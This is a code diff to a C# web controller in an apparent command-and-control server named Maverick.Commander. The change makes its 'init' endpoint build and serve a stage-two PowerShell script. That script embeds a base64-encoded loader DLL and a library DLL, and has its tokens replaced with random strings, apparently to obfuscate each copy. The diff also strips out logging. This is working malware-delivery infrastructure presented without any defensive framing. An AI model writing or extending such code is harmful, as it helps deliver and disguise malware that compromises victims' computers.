@@ -16,7 +16,7 @@ namespace Maverick.Commander.Controllers
     [Route("api")]
     public class CommandController : ControllerBase
     {
-        private readonly ILogger<CommandController> _logger;
+        private readonly IWebHostEnvironment _webHostEnvironment;
         private readonly ICommandAndControl _commandAndControl;
         private readonly string HeaderHashCheck;
         private readonly JsonSerializerOptions options = new()
@@ -24,9 +24,9 @@ namespace Maverick.Commander.Controllers
             PropertyNameCaseInsensitive = true 
         };
 
-        public CommandController(ILogger<CommandController> logger, ICommandAndControl commandAndControl)
+        public CommandController(IWebHostEnvironment webHostEnvironment, ICommandAndControl commandAndControl)
         {
-            _logger = logger;
+            _webHostEnvironment = webHostEnvironment;
             _commandAndControl = commandAndControl;
             HeaderHashCheck = Crypto.GetHash(Key.SecretKey);
         }
@@ -131,7 +131,6 @@ namespace Maverick.Commander.Controllers
             }
             catch (JsonException ex)
             {
-                Console.WriteLine("Deserialization error: " + ex.Message);
                 return BadRequest("Invalid JSON format: " + ex.Message);
             }
 
@@ -153,16 +152,29 @@ namespace Maverick.Commander.Controllers
             return Ok(new { ok = true });
         }
 
-        [HttpPost("init/{cus_hash}")]
+        [HttpGet("init/{cus_hash}")]
         public async Task<IActionResult> InitLoader(string cus_hash)
         {
             if (cus_hash != HeaderHashCheck)
             {
                 return Unauthorized();
             }
-            byte[] net_loader = await System.IO.File.ReadAllBytesAsync("Maverick.dll");//template
-            return File(net_loader, "application/octet-stream");
-        }
 
+            var payload_path = Path.Combine(_webHostEnvironment.WebRootPath, "payload");
+            var net_loader = await System.IO.File.ReadAllBytesAsync(Path.Combine(payload_path, "Maverick.Load.dll"));//template
+            var newtonsoft_dll = await System.IO.File.ReadAllBytesAsync(Path.Combine(payload_path, "Newtonsoft.Json.dll"));
+            var template = await System.IO.File.ReadAllTextAsync(Path.Combine(payload_path, "Raw_Stage2.ps1"));
+            template = template.Replace("__PAYLOAD_B64__", Convert.ToBase64String(net_loader));
+            template = template.Replace("__DLL_NEWTONSOFT_B64__", Convert.ToBase64String(newtonsoft_dll));
+
+            var tokens = GenerateCode.FindTokens(template);
+            if (tokens == null) return NoContent();
+            HashSet<string> generated = [];
+            foreach (var t in tokens)
+            {
+                template = template.Replace(t, GenerateCode.GenerateRandomString(generated));
+            }
+            return Content(template, "text/plain");
+        }
     }
 }
